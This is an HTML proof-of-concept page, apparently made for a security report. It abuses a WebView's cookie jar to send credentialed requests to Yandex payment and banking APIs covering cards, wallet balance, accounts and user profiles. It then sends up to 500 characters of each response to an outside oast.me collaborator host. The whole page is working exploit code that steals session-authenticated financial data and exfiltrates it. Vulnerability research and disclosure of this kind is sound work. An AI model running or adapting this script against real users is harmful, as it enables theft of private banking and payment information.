 <html><head><title>PoC</title></head>
  <body>
  <script>
  // The cookies are HttpOnly so we can't read them directly
  // BUT we can make authenticated requests FROM this WebView
  // because the cookie jar includes them automatically

  var endpoints = [
    "https://pay.yandex.ru/api/v1/user/info",
    "https://pay.yandex.ru/api/v1/cards",
    "https://pay.yandex.ru/api/v1/wallet/balance",
    "https://bank-api.yandex.ru/api/v1/user/profile",
    "https://bank-api.yandex.ru/api/v1/accounts",
    "https://api.bank.yandex.net/v1/user/info",
    "https://authproxy.prod.yb.yandex.net/api/v1/user",
    "https://plus-home.yandex.ru/v1/sdk/configuration",
    "https://plus.yandex.ru/api/v1/user",
  ];

  var results = {};

  Promise.all(endpoints.map(function(url) {
    return fetch(url, {credentials: "include"})
      .then(function(r) { return r.text().then(function(t) { results[url] = {status: r.status, body: t.substring(0,500)}; }); })
      .catch(function(e) { results[url] = {error: e.message}; });
  })).then(function() {
    fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/api-results?" + encodeURIComponent(JSON.stringify(results)));
    document.title = "APIs: " + Object.keys(results).filter(function(k){ return results[k].status === 200; }).length + " success";
  });
  </script>
  </body>
  </html>
